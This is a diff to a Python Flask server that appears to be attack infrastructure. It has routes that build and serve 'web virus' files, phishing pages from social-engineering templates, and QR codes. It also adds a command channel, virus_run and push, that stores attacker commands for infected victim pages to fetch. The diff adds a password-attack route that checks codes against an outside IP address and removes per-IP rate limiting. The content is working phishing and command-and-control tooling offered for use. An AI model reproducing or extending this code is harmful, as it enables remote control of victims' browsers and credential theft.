@@ -35,6 +35,7 @@ class user_sessen():
     attack_type: str = ''
     message: str ='none'
     url_clone: str = ''
+    attack_command: str = ''
 
 def get_random() -> str:
     # 定义可用的字符集，包括26个英文字母（大小写）和数字
@@ -45,6 +46,25 @@ def get_random() -> str:
         return get_random()
     else:
         return random_string
+
+@app.route('/pwd_attack' , methods=['POST'])
+def pwd_attack():
+        data = request.get_data().decode('utf-8').split('\n')
+        url = data[0]
+        check = data[1]
+        body = ''
+
+        for i in range(1, len(data)):
+            body += data[i] +'\n'
+        body = body.strip()
+
+        r = requests.post('http://154.201.85.154:11111/check_ip_check/'+check)
+        if r == 'ok':
+            pass
+        else:
+            return 'check code error.'
+
+        return 'ok'
 
 @app.route('/create_web_virus/<user>/<pwd>' , methods=['GET'])
 def create_web_virus(user , pwd):
@@ -98,25 +118,21 @@ def make_qr_code():
     img.save(img_file)
     img.show()
     file_name = img_file
-    return send_file(file_name, as_attachment=True, attachment_filename=file_name)
+    return send_file(file_name, as_attachment=True)
 
 @app.route('/get_virus/<file_name>')
 def get_virus(file_name):
-    return send_file("../virus/"+file_name, as_attachment=True, attachment_filename=file_name)
+    return send_file("../virus/"+file_name, as_attachment=True)
 
-@app.route('/push/<attack_url>/<message>')
+@app.route('/push/<attack_url>/<path:message>' , methods=['POST' , 'GET'])
 def get_message(attack_url,message):
 
-    # 限制每个IP对制定api的访问.
-    client_ip = request.remote_addr
-    if client_ip in visit_request:
-        visit_request[client_ip] = visit_request[client_ip] + 1
-        if visit_request[client_ip] >= 9:
-            return 'Too many requests'
-    else:
-        visit_request[client_ip] = 1
-
     if attack_url in url_list.keys():
+        if url_list.get(attack_url).attack_type == 'web_virus':
+            print("11: "+url_list.get(attack_url).attack_command)
+            url_list.get(attack_url).message = unquote(message)
+            return url_list.get(attack_url).attack_command
+
         url_list.get(attack_url).message = unquote(message)
         return 'ok'
 
@@ -160,26 +176,6 @@ def update_virus(filename):
         f.write(data)
     return 'update ok.'
 
-@app.route('/<path:attack_url>')
-def attack_url(attack_url):
-
-    if attack_url in url_list.keys():
-        u: user_sessen = url_list.get(attack_url)
-        r = Response()
-        try:
-            if u.attack_type == 'web_virus':
-                r.data = open('modules/web_virus/index.html').read()
-            else:
-                # print('modules/socialEngine/'+u.attack_type+"/index.html")
-                # print(open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read())
-                r.data = open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read()
-            return r
-        except:
-            return 'the server error'
-                
-    else:
-        return 'your message error'
-
 @app.route('/run/<attack_url>')
 def xhr_run(attack_url):
     if attack_url in url_list.keys():
@@ -188,6 +184,21 @@ def xhr_run(attack_url):
         message_to_return = u.message
         # 更新u.message为'none'
         u.message = 'none'
+        # 返回之前存储的消息
+        return message_to_return
+    else:
+        return 'none'
+    
+@app.route('/virus_run/<attack_url>/<path:command>')
+def virus_run(attack_url , command):
+    print(1)
+    if attack_url in url_list.keys():
+        u: user_sessen = url_list.get(attack_url)
+        # 返回u.message的值
+        message_to_return = u.message
+        # 更新u.message为'none'
+        u.message = 'none'
+        u.attack_command = command
         # 返回之前存储的消息
         return message_to_return
     else:
@@ -269,6 +280,28 @@ def attack(attack_type,user,pwd):
         return n
 
     else:
+        return 'your message error'
+
+@app.route('/<path:attack_url>')
+def attack_url(attack_url):
+
+    if attack_url in url_list.keys():
+        u: user_sessen = url_list.get(attack_url)
+        r = Response()
+        try:
+            if u.attack_type == 'web_virus':
+                r.data = open('modules/web_virus/index.html').read()
+            else:
+                # print('modules/socialEngine/'+u.attack_type+"/index.html")
+                # print(open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read())
+                r.data = open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read()
+            return r
+        except:
+            return 'the server error'
+                
+    else:
+        print(attack_url)
+        print(url_list)
         return 'your message error'
 
 def visit_request_threading() -> None:
